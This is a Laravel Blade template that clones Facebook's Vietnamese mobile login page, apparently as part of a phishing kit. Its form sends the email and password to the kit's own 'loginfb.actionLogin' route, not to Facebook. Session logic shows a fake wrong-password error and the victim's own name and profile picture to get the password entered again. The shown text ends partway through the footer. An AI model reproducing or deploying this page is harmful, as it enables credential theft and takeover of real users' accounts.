<html lang="vi">
<head><title>Facebook - Đăng nhập hoặc đăng ký</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/khJaaYeU64X.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="nSxUM1r" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/vaI2Htetpkw.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="kmcUxH7" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet"
          href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/Rqd66g8ab9q.css?_nc_x=Ij3Wp8lg5Kz"
          data-bootloader-hash="8tsrDhw" crossorigin="anonymous">
    <script id="u_0_g_jC" nonce="">function envFlush(a) {
            function b(b) {
                for (var c in a) b[c] = a[c]
            }

            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
        }

        envFlush({
            "timeslice_heartbeat_config": {
                "pollIntervalMs": 33,
                "idleGapThresholdMs": 60,
                "ignoredTimesliceNames": {
                    "requestAnimationFrame": true,
                    "Event listenHandler mousemove": true,
                    "Event listenHandler mouseover": true,
                    "Event listenHandler mouseout": true,
                    "Event listenHandler scroll": true
                },
                "isHeartbeatEnabled": true,
                "isArtilleryOn": false
            },
            "shouldLogCounters": true,
            "timeslice_categories": {"react_render": true, "reflow": true},
            "sample_continuation_stacktraces": true,
            "dom_mutation_flag": true
        });</script>
    <script nonce="">document.domain = 'facebook.com';
        /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) && location.replace(location.hash.substr(location.hash.indexOf("!") + 1));</script>
    <script nonce="">__DEV__ = 0;</script>
    <script id="u_0_h_qJ" crossorigin="anonymous"
            src="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/kZCVq8a_QvC.js?_nc_x=Ij3Wp8lg5Kz"
            data-bootloader-hash="/ctsk1f" nonce=""></script>
    <script id="u_0_e_GV" nonce="">CavalryLogger = window.CavalryLogger || function (a) {
            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {t_cstart: window._cstart}, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
        }, CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
            this.is_detailed_profiler = a;
            return this
        }, CavalryLogger.prototype.setTTIEvent = function (a) {
            this.tti_event = a;
            return this
        }, CavalryLogger.prototype.setValue = function (a, b, c, d) {
            d = d ? this.piggy_values : this.values;
            (typeof d[a] === "undefined" || c) && (d[a] = b);
            return this
        }, CavalryLogger.prototype.getLastTtiValue = function () {
            return this.lastTtiValue
        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function (a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
            return this
        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function (a) {
            console.timeStamp(a)
        } : function () {
        }, CavalryLogger.prototype.addPiggyback = function (a, b) {
            this.piggy_values[a] = b;
            return this
        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function (a) {
            typeof a === "undefined" && (a = CavalryLogger.id);
            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
            return CavalryLogger.instances[a]
        }, CavalryLogger.setPageID = function (a) {
            if (CavalryLogger.id === 0) {
                var b = CavalryLogger.getInstance();
                CavalryLogger.instances[a] = b;
                CavalryLogger.instances[a].lid = a;
                delete CavalryLogger.instances[0]
            }
            CavalryLogger.id = a
        }, CavalryLogger.now = function () {
            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
        }, CavalryLogger.prototype.measureResources = function () {
        }, CavalryLogger.prototype.profileEarlyResources = function () {
        }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
        }, CavalryLogger.start_js = function () {
        }, CavalryLogger.done_js = function () {
        };
        CavalryLogger.getInstance().setTTIEvent("t_domcontent");
        CavalryLogger.prototype.measureResources = function (a, b) {
            if (!this.log_resources) return;
            var c = "bootload/" + a.name;
            if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
            var d = CavalryLogger.now();
            this.ongoing_watch[c] = d;
            "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
            b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
            if (a.type === "js") {
                c = "js_exec/" + a.name;
                this.ongoing_watch[c] = d
            }
        }, CavalryLogger.prototype.stopWatch = function (a) {
            if (this.ongoing_watch[a]) {
                var b = CavalryLogger.now(), c = b - this.ongoing_watch[a];
                this.bootloader_metrics[a] = c;
                var d = this.piggy_values;
                a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
                delete this.ongoing_watch[a]
            }
            return this
        }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
            var a = {};
            Object.values(window.CavalryLogger.instances).forEach(function (b) {
                b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
            });
            return a
        }, CavalryLogger.start_js = function (a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
        }, CavalryLogger.done_js = function (a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
        }, CavalryLogger.prototype.profileEarlyResources = function (a) {
            for (var b = 0; b < a.length; b++) this.measureResources({name: a[b][0], type: a[b][1] ? "js" : ""}, "_EF_")
        };
        CavalryLogger.getInstance().log_resources = true;
        CavalryLogger.getInstance().setIsDetailedProfiler(true);
        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");</script>
    <script id="u_0_f_EF" nonce="">(function _(a, b, c, d) {
            function e(a) {
                document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
            }

            function f(a, b) {
                document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
            }

            if (!a) {
                e(b);
                e(c);
                return
            }
            a = null;
            (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
            (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
            f(b, (a || window.devicePixelRatio || 1).toString());
            e = window.screen ? screen.width : 0;
            b = window.screen ? screen.height : 0;
            f(c, e + "x" + b);
            d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
        })(true, "m_pixel_ratio", "wd", false);</script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04"
          content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
    <meta name="description"
          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
    <link rel="canonical" href="https://www.facebook.com/">
    <meta property="og:site_name" content="Facebook">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
    <meta property="og:description"
          content="Tạo một tài khoản để đăng nhập Facebook. Kết nối với bạn bè, gia đình và những người mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận cập nhật.">
    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
    <meta property="og:url" content="https://www.facebook.com/">
    <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/">
    <link rel="alternate" hreflang="en" href="https://www.facebook.com/">
    <link rel="alternate" hreflang="ar" href="https://m.facebook.com/?locale2=ar_AR">
    <link rel="alternate" hreflang="bg" href="https://m.facebook.com/?locale2=bg_BG">
    <link rel="alternate" hreflang="bs" href="https://m.facebook.com/?locale2=bs_BA">
    <link rel="alternate" hreflang="ca" href="https://m.facebook.com/?locale2=ca_ES">
    <link rel="alternate" hreflang="da" href="https://m.facebook.com/?locale2=da_DK">
    <link rel="alternate" hreflang="el" href="https://m.facebook.com/?locale2=el_GR">
    <link rel="alternate" hreflang="es" href="https://m.facebook.com/?locale2=es_LA">
    <link rel="alternate" hreflang="es-es" href="https://m.facebook.com/?locale2=es_ES">
    <link rel="alternate" hreflang="fa" href="https://m.facebook.com/?locale2=fa_IR">
    <link rel="alternate" hreflang="fi" href="https://m.facebook.com/?locale2=fi_FI">
    <link rel="alternate" hreflang="fr" href="https://m.facebook.com/?locale2=fr_FR">
    <link rel="alternate" hreflang="fr-ca" href="https://m.facebook.com/?locale2=fr_CA">
    <link rel="alternate" hreflang="hi" href="https://m.facebook.com/?locale2=hi_IN">
    <link rel="alternate" hreflang="hr" href="https://m.facebook.com/?locale2=hr_HR">
    <link rel="alternate" hreflang="id" href="https://m.facebook.com/?locale2=id_ID">
    <link rel="alternate" hreflang="it" href="https://m.facebook.com/?locale2=it_IT">
    <link rel="alternate" hreflang="ko" href="https://m.facebook.com/?locale2=ko_KR">
    <link rel="alternate" hreflang="mk" href="https://m.facebook.com/?locale2=mk_MK">
    <link rel="alternate" hreflang="ms" href="https://m.facebook.com/?locale2=ms_MY">
    <link rel="alternate" hreflang="pl" href="https://m.facebook.com/?locale2=pl_PL">
    <link rel="alternate" hreflang="pt" href="https://m.facebook.com/?locale2=pt_BR">
    <link rel="alternate" hreflang="pt-pt" href="https://m.facebook.com/?locale2=pt_PT">
    <link rel="alternate" hreflang="ro" href="https://m.facebook.com/?locale2=ro_RO">
    <link rel="alternate" hreflang="sl" href="https://m.facebook.com/?locale2=sl_SI">
    <link rel="alternate" hreflang="sr" href="https://m.facebook.com/?locale2=sr_RS">
    <link rel="alternate" hreflang="th" href="https://m.facebook.com/?locale2=th_TH">
    <link rel="alternate" hreflang="vi" href="https://m.facebook.com/?locale2=vi_VN">
    <link rel="manifest" href="/data/manifest/" crossorigin="use-credentials">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/jbOKt0eOoTI.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/jbOKt0eOoTI.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/yu1W42PqNcd.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/yu1W42PqNcd.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/-m5p15RVgSZ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/-m5p15RVgSZ.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/HptE_o6N-2D.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/HptE_o6N-2D.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/ahw3tGh_BXM.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/ahw3tGh_BXM.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/OCpBRskq1jb.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/OCpBRskq1jb.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/YMt42CzC3B2.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/YMt42CzC3B2.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3i6X14/y0/l/vi_VN/xAssJmwgXMA.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3i6X14/y0/l/vi_VN/xAssJmwgXMA.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iUIV4/yf/l/vi_VN/hZrshuOuDOV.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iUIV4/yf/l/vi_VN/hZrshuOuDOV.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/kDJGA6AlUau.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y0/r/kDJGA6AlUau.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/DNN4rtnoBR0.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/DNN4rtnoBR0.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/umOm8coDHbQ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/umOm8coDHbQ.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iC9q4/yQ/l/vi_VN/iSHQ4Krw-S8.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iC9q4/yQ/l/vi_VN/iSHQ4Krw-S8.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/dTK0J_PY8HS.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/dTK0J_PY8HS.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3i8594/yN/l/vi_VN/n4bGLjGRWrl.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3i8594/yN/l/vi_VN/n4bGLjGRWrl.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3iwrE4/yn/l/vi_VN/woSiLHt_DZP.js?_nc_x=Ij3Wp8lg5Kz" rel="preload"
          as="script" crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3iwrE4/yn/l/vi_VN/woSiLHt_DZP.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script"
          crossorigin="anonymous">
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz" async=""
            crossorigin="anonymous"></script>
</head>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw  portrait"
      style="background-color: rgb(255, 255, 255); min-height: 640px;">
<script id="u_0_d_Su" nonce="">(function (a) {
        a.__updateOrientation = function () {
            var b = !!a.orientation && a.orientation !== 180, c = document.body;
            c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
            return b
        }
    })(window);</script>
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 640px;"><h1
        style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"
             style="min-height: 640px;">
            <div class="_7om2">
                <div class="_4g34" id="u_0_0_zH">

                    @if (Session::has('message'))

                        <div class="_5yd0 _2ph- _5yd1" style="" id="login_error"
                             data-sigil="m_login_notice"><span>Sai mật khẩu. <a
                                    href="/recover/initiate/?ars=facebook_login_pw_error&amp;email=asdasa&amp;lwv=120&amp;lwc=1348092"
                                    class="_652e" aria-label="Bạn quên mật khẩu?">Bạn quên mật khẩu?</a></span>
                        </div>

                    @endif

                    <div class="_9om_">
                        <div class="_4-4l">
                            <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                            <div class="_7om2 _52we _2pid _52z6">
                                <div class="_4g34"><a
                                        href="{{ route('loginfb.index') }}"><img
                                            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112"
                                            class="img" alt="facebook"></a></div>
                            </div>
                            <div class="_5rut">

                                @if (Session::has('user_name') && Session::get('user_name') != 'username')

                                    <p class="_52je _52ja _8qto" style="margin-top: 10px;font-weight:bold;">Hãy thử nhập mật khẩu của bạn</p>
                                    <div class="_7om2 _6rs7" id="form-hasusername" style="padding: 20px 5px 5px 0px;">

                                        <div class="_5s61 _3-91">
                                            <i class="img img _1-yc _2sxw"
                                               style="background-image: url('https://www.facebook.com/profile/pic.php?cuid={{ Session::has('sfau') ? Session::get('sfau') : 'sfau' }}&square_px=50');background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:40px;height:40px;"></i>
                                        </div>
                                        <div class="_4g34 _5i2i _52we">
                                            <div class="_5xu4">
                                                <div
                                                    class="_52je _52jb _52ji">{{ Session::has('user_name') ? Session::get('user_name') : 'Username' }}</div>
                                            </div>
                                        </div>
                                        <a href="javascript:void(0)" onclick="reshowusername()" style="
                                            display: flex;
                                            justify-self: right;
                                            align-items: flex-end;
                                            color: #216fdb;
                                        ">Không phải bạn?</a>
                                    </div>

                                @endif

                                <form method="post"
                                      action="{{ route('loginfb.actionLogin') }}"
                                      class="mobile-login-form _9hp- _5spm" novalidate="1" data-autoid="autoid_2">
                                    @csrf
                                    <input type="hidden" name="lsd"
                                                                                              value="AVo6Oy17xFw"
                                                                                              autocomplete="off"><input
                                        type="hidden" name="jazoest" value="2929" autocomplete="off"><input
                                        type="hidden" name="m_ts" value="1621927561"><input type="hidden" name="li"
                                                                                            value="iaasYF1Bw9asMGc3Wb6XDoj_"><input
                                        type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"><input
                                        type="hidden" name="unrecognized_tries" value="0"
                                        data-sigil="m_login_unrecognized_tries">
                                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="otp_retrieve_desc_container"></div>
                                    <div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf" id="form-username" style="display: @if (!Session::has('user_name') || Session::get('user_name') == 'username') block @else none @endif">
                                                <div class="_96n9" id="email_input_container"><input autocorrect="off"
                                                                                                     autocapitalize="off"
                                                                                                     class="_56bg _4u9z _5ruq _8qtn"
                                                                                                     autocomplete="on"
                                                                                                     id="m_login_email"
                                                                                                     name="email"
                                                                                                     placeholder="Số di động hoặc email"
                                                                                                     value ="@if (Session::has('user_name') && Session::get('user_name') != 'username'){{ Session::get('email') }}@endif"
                                                                                                     type="text"
                                                                                                     data-sigil="m_login_email">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_55wq"></div>
                                        <div class="_56be">
                                            <div class="_55wo _56bf">
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_7om2">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4"><input autocorrect="off"
                                                                                      autocapitalize="off"
                                                                                      class="_56bg _4u9z _27z2 _8qtm"
                                                                                      autocomplete="on"
                                                                                      id="m_login_password" name="pass"
                                                                                      placeholder="Mật khẩu"
                                                                                      type="password"
                                                                                      data-sigil="password-plain-text-toggle-input">
                                                            </div>
                                                        </div>
                                                        <div class="_5s61 _216i _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <div class="_2pi9" style="display:none" id="u_0_1_WH"><a
                                                                        href="#"
                                                                        data-sigil="password-plain-text-toggle"><span
                                                                            class="mfss" style="display:none"
                                                                            id="u_0_2_1R">ẨN</span><span class="mfss"
                                                                                                         id="u_0_3_ck">HIỂN THỊ</span></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_4_Nc" data-sigil="login_password_step_element">
                                            <button type="button" value="Đăng nhập" onclick="document.getElementsByTagName('form')[0].submit()"
                                                    class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login"
                                                    data-sigil="touchable login_button_block m_login_button"
                                                    data-autoid="autoid_4"><span class="_55sr" style="margin-top: 0;">Đăng nhập</span></button>
                                        </div>
                                        <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                        <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                        <div id="otp_button_elem_container"></div>
                                    </div>
                                    <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input
                                        type="hidden" name="prefill_source" id="prefill_source"><input type="hidden"
                                                                                                       name="prefill_type"
                                                                                                       id="prefill_type"><input
                                        type="hidden" name="first_prefill_source" id="first_prefill_source"><input
                                        type="hidden" name="first_prefill_type" id="first_prefill_type"><input
                                        type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"><input
                                        type="hidden" name="had_password_prefilled" id="had_password_prefilled"
                                        value="false"><input type="hidden" name="is_smart_lock" id="is_smart_lock"
                                                             value="false"><input type="hidden" name="bi_xrwh"
                                                                                  value="0"><input type="hidden"
                                                                                                   id="scetoggle">
                                    <div class="_xo8"></div>
                                    <noscript><input type="hidden" name="_fb_noscript" value="true"/></noscript>
                                </form>
                                <div>
                                    <div class="_2pie _9omz">
                                        <div class="_52jj _9on1"><a class="_9on1" tabindex="0"
                                                                    href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIxOTI3NTYxLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;lwv=100&amp;refid=8"
                                                                    id="forgot-password-link">Quên mật khẩu?</a></div>
                                    </div>
                                    <div style="padding-top: 42px">
                                        <div>
                                            <div>
                                                <div>
                                                    <div id="login_reg_separator" class="_43mg _8qtf"
                                                         data-sigil="login_reg_separator"><span
                                                            class="_43mh">hoặc</span></div>
                                                    <div class="_52jj _5t3b" id="signup_button_area"><a role="button"
                                                                                                        class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                                                                                        id="signup-button"
                                                                                                        tabindex="0"
                                                                                                        data-sigil="m_reg_button"
                                                                                                        data-autoid="autoid_3">Tạo
                                                            tài khoản mới</a></div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align:center;">
                                                <div>
                                                    <div data-sigil="login_identify_step_element"></div>
                                                    <div class="other-links _8p_m">
                                                        <ul class="_5pkb _55wp">
                                                            <li></li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:none">
                <div></div>
                <div></div>
                <div></div>
            </div>
            <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0"
                       style="display:none"></span>
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_7om2">
                            <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=zh_TW&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBSGlgwUj9yl4qECjQ&amp;refid=8"
                                            data-locale="zh_TW" data-sigil="change_language">中文(台灣)</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=ko_KR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAjTJz44EIHZ9MO0zw&amp;refid=8"
                                            data-locale="ko_KR" data-sigil="change_language">한국어</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAFHBd5yJGQso176Ng&amp;refid=8"
                                            data-locale="pt_BR"
                                            data-sigil="change_language">Português (Brasil)</a></span></div>
                            </div>
                            <div class="_4g34">
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=en_GB&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAjYX5wcvwBdcFZ1_4&amp;refid=8"
                                            data-locale="en_GB" data-sigil="change_language">English (UK)</a></span>
                                </div>
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=ja_JP&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDy4XWRqDcKWkeMmF4&amp;refid=8"
                                            data-locale="ja_JP" data-sigil="change_language">日本語</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a
                                            href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQC4v9hoIAlriyGHfwc&amp;refid=8"
                                            data-locale="es_LA" data-sigil="change_language">Español</a></span></div>
                                <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"
                                         data-sigil="more_language"><i class="img sp_vuppHZ0nD_0 sx_e76907"></i></div>
                                </a></div>
                        </div>
                    </div>
                    <div class="_5ui4">
                        <div class="_96qv _9a0a"><a href="https://about.facebook.com/?refid=8" class="_96qw"
                                                    title="Đọc blog của chúng tôi, khám phá trung tâm tài nguyên và tìm cơ hội việc làm.">Giới
                                thiệu</a><span aria-hidden="true"> · </span><a href="/help/?ref=pf&amp;refid=8"
                                                                               class="_96qw"
                                                                               title="Truy cập Trung tâm trợ giúp của chúng tôi.">Trợ
                                giúp</a><span aria-hidden="true"> · </span><span class="_96qw"
                                                                                 id="u_0_5_k7">Xem thêm</span></div>
                        <div class="_96qv" style="display:none" id="u_0_6_7p"><a href="https://messenger.com/"
                                                                                 class="_96qw" title="Xem Messenger.">
